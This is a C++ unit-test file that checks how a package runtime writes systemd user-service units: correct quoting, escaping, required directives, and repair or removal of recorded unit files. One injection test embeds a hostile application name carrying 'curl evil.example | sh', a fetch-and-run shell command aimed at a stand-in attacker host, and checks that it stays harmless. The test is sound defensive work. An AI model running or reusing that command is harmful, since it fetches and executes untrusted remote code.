// Session-manager integration: the unit text, and the durable record of it
// (src/lexe/integration/session.hpp, session_manager.hpp, docs/SERVICES.md).
//
// Split deliberately from the shell lane that talks to a real `systemd --user`.
// What lives here is everything that is a function of its inputs — the text of
// the unit, and what .LEXE records about it — so it runs on a host with no
// systemd at all, including Windows and CI. What needs a live session manager is
// tests/session/, which SKIPs when there is none.
//
// The first case is a regression for a defect that got all the way through an
// end-to-end run: a unit that was valid, enabled, recorded, and could never
// start.

#include <doctest/doctest.h>

#include "helpers.hpp"

#include "lexe/base/error.hpp"
#include "lexe/base/paths.hpp"
#include "lexe/base/util.hpp"
#include "lexe/integration/integration.hpp"
#include "lexe/integration/session.hpp"
#include "lexe/integration/session_manager.hpp"
#include "lexe/package/manifest.hpp"

#include <filesystem>
#include <string>

namespace fs = std::filesystem;
using namespace lexe;

namespace {

/// A service manifest, minimal but real: only what unit generation reads.
Manifest service_manifest(const std::string& id = "com.example.daemon",
                          const std::string& name = "Example Daemon") {
    Manifest m;
    m.id = id;
    m.name = name;
    m.version = "1.0.0";
    m.role = PackageRole::Application;
    m.launch_mode = LaunchMode::Service;
    return m;
}

/// The value of one `Key=` directive, or empty when absent.
std::string directive(const std::string& unit, const std::string& key) {
    const std::string needle = "\n" + key + "=";
    const std::size_t at = ("\n" + unit).find(needle);
    if (at == std::string::npos) return {};
    const std::size_t start = at + needle.size() - 1;
    const std::size_t end = unit.find('\n', start);
    return unit.substr(start, end == std::string::npos ? end : end - start);
}

session::UnitInputs inputs_for(const Manifest& m, std::string runtime,
                               std::string home = {}) {
    session::UnitInputs in;
    in.manifest = m;
    in.runtime_path = std::move(runtime);
    in.lexe_home = std::move(home);
    return in;
}

} // namespace

TEST_SUITE("session-units") {

// ------------------------------------------------------------------- quoting

TEST_CASE("a runtime path containing a space still execs") {
    // REGRESSION. systemd splits ExecStart= on whitespace, exactly as a shell
    // would, and the runtime path is wherever the runtime happens to be
    // installed. The first end-to-end run of this feature generated
    //
    //     ExecStart=/mnt/c/Users/Bennyt 2/.../build-linux/lexe run <id> --wait
    //
    // and systemd read it as the command `/mnt/c/Users/Bennyt` with the
    // arguments `2/.../lexe`, `run`, `<id>`, `--wait`. The service failed with
    // 203/EXEC at every start, and Restart=on-failure turned that into a
    // restart loop. The unit was valid, `systemctl is-enabled` said `enabled`,
    // and it could never run — which is the worst shape a defect like this can
    // take, because nothing about the unit looks wrong.
    const std::string unit = session::unit_text(inputs_for(
        service_manifest(), "/opt/my apps/lexe runtime/lexe"));

    const std::string exec = directive(unit, "ExecStart");
    INFO("ExecStart was: " << exec);
    // The whole path must be one word, which means quoted.
    CHECK(exec.find("\"/opt/my apps/lexe runtime/lexe\"") == 0);
    // And what follows must still be separate words, or nothing runs at all.
    CHECK(exec.find(" run ") != std::string::npos);
    CHECK(exec.find("--wait") != std::string::npos);
}

TEST_CASE("a LEXE_HOME containing a space is one assignment") {
    // The same hazard in Environment=, which systemd also splits on whitespace:
    // an unquoted `LEXE_HOME=/tmp/a b/home` sets LEXE_HOME=/tmp/a and then
    // fails on the word `b/home`, which is not an assignment. Silently pointing
    // a service at a different installation root is worse than failing.
    const std::string unit = session::unit_text(
        inputs_for(service_manifest(), "/usr/bin/lexe", "/tmp/scratch dir/home"));
    const std::string env = directive(unit, "Environment");
    INFO("Environment was: " << env);
    CHECK(env == "\"LEXE_HOME=/tmp/scratch dir/home\"");
}

TEST_CASE("a percent in a path does not become a systemd specifier") {
    // `%` introduces a specifier that systemd expands — `%h` is the home
    // directory — and an UNKNOWN specifier makes the whole unit fail to load.
    // `%` is a perfectly legal character in a POSIX path, so a runtime under
    // `~/opt/50%off/` would otherwise produce a unit pointing somewhere else or
    // refusing to load. `%%` is the literal.
    const std::string unit = session::unit_text(
        inputs_for(service_manifest(), "/opt/50%off/lexe", "/tmp/100%/home"));
    CHECK(directive(unit, "ExecStart").find("50%%off") != std::string::npos);
    CHECK(directive(unit, "Environment").find("100%%") != std::string::npos);

    // Including in display text, which is publisher-controlled.
    const std::string named = session::unit_text(inputs_for(
        service_manifest("com.example.daemon", "100% Daemon"), "/usr/bin/lexe"));
    CHECK(directive(named, "Description").find("100%%") != std::string::npos);
}

TEST_CASE("a dollar sign in a path is not expanded as a variable") {
    // systemd expands `$VAR` and `${VAR}` in ExecStart. A path containing a
    // literal `$` — legal, and not rare in generated build trees — would
    // otherwise be replaced by the value of an environment variable, or by
    // nothing at all.
    const std::string unit = session::unit_text(
        inputs_for(service_manifest(), "/opt/$HOME-relative/lexe"));
    const std::string exec = directive(unit, "ExecStart");
    INFO("ExecStart was: " << exec);
    CHECK(exec.find("$$HOME-relative") != std::string::npos);
}

// ----------------------------------------------------------------- injection

TEST_CASE("a newline in the application name cannot inject a directive") {
    // `Description=` is derived from manifest.name, which is publisher-
    // controlled text, and a unit value runs to end of line. A name carrying a
    // newline could otherwise close Description= and open a directive of its
    // own choosing — the desktop-entry injection hazard in a different file
    // format. The dangerous word here is ExecStart, so that is what is checked:
    // exactly one of them, and it is ours.
    const Manifest hostile = service_manifest(
        "com.example.daemon",
        "Innocent\nExecStart=/bin/sh -c 'curl evil.example | sh'\nX=");
    const std::string unit =
        session::unit_text(inputs_for(hostile, "/usr/bin/lexe"));

    // Counted as DIRECTIVES — lines beginning with the key — not as substrings.
    // The injected text survives inside the Description value, so a substring
    // count finds two and proves nothing; what decides whether the injection
    // worked is whether a second one ever begins a line.
    std::size_t execs = 0;
    for (std::size_t at = ("\n" + unit).find("\nExecStart=");
         at != std::string::npos;
         at = ("\n" + unit).find("\nExecStart=", at + 1)) {
        ++execs;
    }
    INFO("generated unit:\n" << unit);
    CHECK(execs == 1);
    CHECK(directive(unit, "ExecStart").find("/usr/bin/lexe") != std::string::npos);
    // The injected text is not erased — a name is display text, and a package
    // with an odd one is not necessarily hostile. What matters is WHERE it ends
    // up: folded into the Description value, where it is a string, and not on a
    // line of its own, where it would be a directive.
    CHECK(directive(unit, "Description").find("curl evil.example") !=
          std::string::npos);
    CHECK(unit.find("\nExecStart=/bin/sh") == std::string::npos);
    CHECK(unit.find("\nX=") == std::string::npos);
    CHECK(directive(unit, "Description").find("Innocent") != std::string::npos);
    CHECK(directive(unit, "Description").find('\n') == std::string::npos);
}

TEST_CASE("a carriage return is stripped as well as a newline") {
    // A lone CR is not a line terminator for systemd's parser, but it is for
    // plenty of things that read unit files afterwards, and it has no business
    // in a description either way.
    const std::string unit = session::unit_text(inputs_for(
        service_manifest("com.example.daemon", "Before\rAfter"),
        "/usr/bin/lexe"));
    CHECK(unit.find('\r') == std::string::npos);
}

// ------------------------------------------------------- what a unit must say

TEST_CASE("the unit invokes lexe run --wait, and Type=simple") {
    // --wait is load-bearing and the reason this design works at all. Without
    // it `lexe run` returns immediately for a service, a Type=simple unit
    // concludes its main process died, and Restart= turns that into an infinite
    // restart loop against a payload that is still running — two supervisors
    // fighting over one process, which is precisely what docs/SERVICES.md
    // forbids.
    const std::string unit =
        session::unit_text(inputs_for(service_manifest(), "/usr/bin/lexe"));
    CHECK(directive(unit, "Type") == "simple");
    CHECK(directive(unit, "ExecStart").find("--wait") != std::string::npos);
    CHECK(directive(unit, "ExecStart").find(" run ") != std::string::npos);
    // on-failure, not always: an application that exits 0 has finished, and
    // restarting it would overrule the program.
    CHECK(directive(unit, "Restart") == "on-failure");
    CHECK(directive(unit, "WantedBy") == "default.target");
    // No PIDFile: the runtime writes none, so naming one would be a lie.
    CHECK(directive(unit, "PIDFile").empty());
}

TEST_CASE("LEXE_HOME is pinned only when it is an override") {
    const std::string plain =
        session::unit_text(inputs_for(service_manifest(), "/usr/bin/lexe"));
    INFO("an ordinary unit must not pin a root, so it follows a home that moves");
    CHECK(plain.find("Environment=") == std::string::npos);

    const std::string pinned = session::unit_text(
        inputs_for(service_manifest(), "/usr/bin/lexe", "/tmp/scratch/home"));
    CHECK(pinned.find("Environment=") != std::string::npos);
}

TEST_CASE("a non-service is refused, with a reason a frontend can show") {
    // Generating a unit for a GUI application would answer a question nobody
    // asked: Restart= would fight the user closing its window.
    for (const LaunchMode mode : {LaunchMode::Gui, LaunchMode::Console}) {
        Manifest m = service_manifest();
        m.launch_mode = mode;
        CHECK_FALSE(session::is_session_manageable(m));
        const std::string why = session::session_unmanageable_reason(m);
        INFO("mode " << static_cast<int>(mode) << " reason: " << why);
        CHECK_FALSE(why.empty());
        CHECK_THROWS_AS(session::unit_text(inputs_for(m, "/usr/bin/lexe")),
                        lexe::Error);
    }

    Manifest launch_ref = service_manifest();
    launch_ref.role = PackageRole::Launch;
    CHECK_FALSE(session::is_session_manageable(launch_ref));
    CHECK_FALSE(session::session_unmanageable_reason(launch_ref).empty());

    CHECK(session::is_session_manageable(service_manifest()));
    CHECK(session::session_unmanageable_reason(service_manifest()).empty());
}

TEST_CASE("an absent runtime path is refused rather than guessed") {
    // A systemd --user unit inherits no PATH, so a bare `lexe` would fail with
    // 203/EXEC. Refusing beats writing a unit that cannot start.
    CHECK_THROWS_AS(session::unit_text(inputs_for(service_manifest(), "")),
                    lexe::Error);
}

TEST_CASE("the unit name is namespaced, and the path is under config home") {
    test::TempLexeHome home;
    const Paths paths = Paths::detect();

    CHECK(session::unit_name("com.example.daemon") ==
          "lexe-com.example.daemon.service");
    // Prefixed because ~/.config/systemd/user is a shared namespace: an id
    // alone could collide with something the user or their distribution put
    // there, and a name that says who owns it is also the name doctor can
    // recognise as ours.
    const std::string path = session::unit_path(paths, "com.example.daemon");
    CHECK(path.find("systemd/user/lexe-com.example.daemon.service") !=
          std::string::npos);
    INFO("path was: " << path);
    CHECK(fs::path(path).is_absolute());
}

// --------------------------------------------------- the durable record of it

TEST_CASE("self_executable gives an absolute path to this test binary") {
    // The whole enable path depends on this: without it the unit cannot name
    // the runtime, and session_manager refuses rather than guessing.
    const std::optional<fs::path> self = util::self_executable();
    REQUIRE(self.has_value());
    CHECK(self->is_absolute());
    std::error_code ec;
    CHECK(fs::is_regular_file(*self, ec));
    CHECK(self->string().find(" (deleted)") == std::string::npos);
}

TEST_CASE("a recorded unit is carried forward by integration repair") {
    // install_app() rewrites an application's WHOLE integration scope, so any
    // artifact not re-listed is silently de-registered. A recorded unit must
    // therefore survive an unrelated re-registration — otherwise `lexe doctor`
    // would stop watching it and uninstall would leave it behind for a service
    // that no longer exists.
    test::TempLexeHome home;
    const Paths paths = Paths::detect();
    const Manifest manifest = service_manifest();

    // Record a unit by hand, standing in for `lexe service enable` (which needs
    // a live session manager, and this case does not).
    const fs::path unit_file = fs::path(session::unit_path(paths, manifest.id));
    const std::string text =
        session::unit_text(inputs_for(manifest, "/usr/bin/lexe"));
    util::write_atomic(unit_file, std::string_view(text));

    IntegrationState state = IntegrationState::load(paths);
    IntegrationArtifact unit;
    unit.kind = ArtifactKind::SessionUnit;
    unit.path = unit_file.string();
    unit.sha256 = crypto::sha256_file_hex(unit_file);
    unit.owner_app = manifest.id;
    state.replace_scope(manifest.id, {unit});
    state.save(paths);

    DesktopIntegration integration(paths);
    integration.install_app(manifest, paths.home() / "no-such-icons");

    bool still_recorded = false;
    for (const IntegrationArtifact& a :
         IntegrationState::load(paths).scope(manifest.id)) {
        if (a.kind == ArtifactKind::SessionUnit) still_recorded = true;
    }
    INFO("re-registering an application must not de-register its unit");
    CHECK(still_recorded);
    CHECK(fs::exists(unit_file));
}

TEST_CASE("a missing unit file is regenerated, and its enablement is not") {
    // The asymmetry docs/SERVICES.md insists on: the FILE is an artifact .LEXE
    // wrote and can write again, so repair restores it. Whether it is ENABLED is
    // a decision the user made, and nothing here may touch it — a repair that
    // re-enabled what somebody deliberately disabled would be overruling them
    // under the name of fixing them. Checked by consequence: no systemctl is
    // invoked on this path at all, so a host with no session manager still
    // repairs the file.
    test::TempLexeHome home;
    const Paths paths = Paths::detect();
    const Manifest manifest = service_manifest();

    const fs::path unit_file = fs::path(session::unit_path(paths, manifest.id));
    const std::string original =
        session::unit_text(inputs_for(manifest, "/usr/bin/lexe"));
    util::write_atomic(unit_file, std::string_view(original));

    IntegrationState state = IntegrationState::load(paths);
    IntegrationArtifact unit;
    unit.kind = ArtifactKind::SessionUnit;
    unit.path = unit_file.string();
    unit.sha256 = crypto::sha256_file_hex(unit_file);
    unit.owner_app = manifest.id;
    state.replace_scope(manifest.id, {unit});
    state.save(paths);

    fs::remove(unit_file);
    REQUIRE_FALSE(fs::exists(unit_file));

    DesktopIntegration integration(paths);
    const IntegrationReport report =
        integration.install_app(manifest, paths.home() / "no-such-icons");

    INFO("report notes: " << (report.notes.empty() ? "" : report.notes.front()));
    CHECK(fs::exists(unit_file));
    // Regenerated from the installed manifest, so it must say the same things.
    const std::string back = util::slurp_text(unit_file);
    CHECK(directive(back, "Type") == "simple");
    CHECK(directive(back, "ExecStart").find("--wait") != std::string::npos);
    // And the record must now pin the content that is actually there, or the
    // next verify() would report it as modified for ever.
    for (const IntegrationArtifact& a :
         IntegrationState::load(paths).scope(manifest.id)) {
        if (a.kind != ArtifactKind::SessionUnit) continue;
        CHECK(a.sha256 == crypto::sha256_file_hex(unit_file));
    }
}

TEST_CASE("removing an application removes its unit file") {
    test::TempLexeHome home;
    const Paths paths = Paths::detect();
    const Manifest manifest = service_manifest();

    const fs::path unit_file = fs::path(session::unit_path(paths, manifest.id));
    util::write_atomic(
        unit_file,
        std::string_view(session::unit_text(inputs_for(manifest, "/usr/bin/lexe"))));

    IntegrationState state = IntegrationState::load(paths);
    IntegrationArtifact unit;
    unit.kind = ArtifactKind::SessionUnit;
    unit.path = unit_file.string();
    unit.sha256 = crypto::sha256_file_hex(unit_file);
    unit.owner_app = manifest.id;
    state.replace_scope(manifest.id, {unit});
    state.save(paths);

    DesktopIntegration(paths).remove_app(manifest.id);

    INFO("a removed application must not leave a unit systemd would still read");
    CHECK_FALSE(fs::exists(unit_file));
    CHECK(IntegrationState::load(paths).scope(manifest.id).empty());
}

TEST_CASE("the artifact kind round-trips through its recorded name") {
    // integration.json is durable state read by later runtimes; a kind that
    // did not round-trip would make every recorded unit unreadable.
    CHECK(std::string(to_string(ArtifactKind::SessionUnit)) == "session-unit");
    ArtifactKind back = ArtifactKind::RuntimeMime;
    CHECK(artifact_kind_from_string("session-unit", back));
    CHECK(back == ArtifactKind::SessionUnit);
}

// ------------------------------------------------- reporting an absent manager

TEST_CASE("a session manager always exists, and says truthfully what it is") {
    // make_session_manager never returns nullptr, so no caller branches on
    // existence — only on capabilities. On a host with no systemd that means a
    // reported unavailability WITH a reason, not a crash and not a pretence.
    test::TempLexeHome home;
    const Paths paths = Paths::detect();
    const std::unique_ptr<session::SessionManager> manager =
        session::make_session_manager(paths);
    REQUIRE(manager != nullptr);

    const session::ManagerCapabilities caps = manager->capabilities();
    INFO("status: " << session::to_string(caps.status)
                    << " detail: " << caps.detail);
    CHECK_FALSE(caps.detail.empty()); // a reason is never optional
    CHECK_FALSE(std::string(session::to_string(caps.status)).empty());

    // Whatever the host is, asking about an application must not throw: a status
    // query is the thing you run when something is already wrong.
    const session::SessionState st = manager->state("com.example.daemon");
    CHECK(st.unit_name == "lexe-com.example.daemon.service");
    CHECK_FALSE(st.unit_path.empty());
    CHECK_FALSE(st.unit_present); // nothing was enabled in this scratch root
    CHECK_FALSE(st.unit_recorded);

    // And enabling must refuse for a reason, never half-do it, when the manager
    // is unavailable. Where one IS available this is a genuine enable, so the
    // assertion is only on the shape of the outcome.
    if (caps.status != session::ManagerStatus::Available) {
        CHECK_THROWS_AS(manager->enable(service_manifest(), "/usr/bin/lexe", false),
                        lexe::Error);
        CHECK_FALSE(fs::exists(fs::path(st.unit_path)));
    }

    // Disable is idempotent everywhere: the asked-for end state is "no unit",
    // and there is no unit.
    CHECK_NOTHROW(manager->disable("com.example.daemon"));
}

TEST_CASE("a non-service is refused before any unit is written") {
    test::TempLexeHome home;
    const Paths paths = Paths::detect();
    Manifest gui = service_manifest();
    gui.launch_mode = LaunchMode::Gui;

    const std::unique_ptr<session::SessionManager> manager =
        session::make_session_manager(paths);
    CHECK_THROWS_AS(manager->enable(gui, "/usr/bin/lexe", false), lexe::Error);
    INFO("a refusal must leave nothing behind");
    CHECK_FALSE(fs::exists(fs::path(session::unit_path(paths, gui.id))));
}

} // TEST_SUITE
